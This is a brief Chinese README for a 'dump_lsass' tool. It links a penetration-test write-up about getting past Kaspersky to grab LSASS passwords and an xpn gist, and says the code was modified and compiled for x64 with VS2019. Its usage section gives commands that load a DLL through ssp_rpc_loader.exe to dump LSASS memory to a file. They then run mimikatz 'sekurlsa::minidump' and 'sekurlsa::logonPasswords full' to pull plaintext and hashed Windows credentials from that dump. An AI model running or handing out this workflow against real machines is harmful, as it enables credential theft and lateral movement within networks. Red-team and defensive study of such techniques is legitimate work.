# dump_lsass
# 参考

[https://www.4hou.com/posts/y6jW](https://www.4hou.com/posts/y6jW)

[这是一篇“不一样”的真实渗透测试案例分析文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#442-%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E6%8A%93lsass%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81)

[https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e](https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e)

对于代码做了部分修改，使用vs2019编译，选择x64编译
# 使用方法
···
ssp_rpc_loader.exe Dll1.dll
dir c:\windows\temp
mimikatz.exe "sekurlsa::minidump 1.bin" "sekurlsa::logonPasswords full" "exit"
···
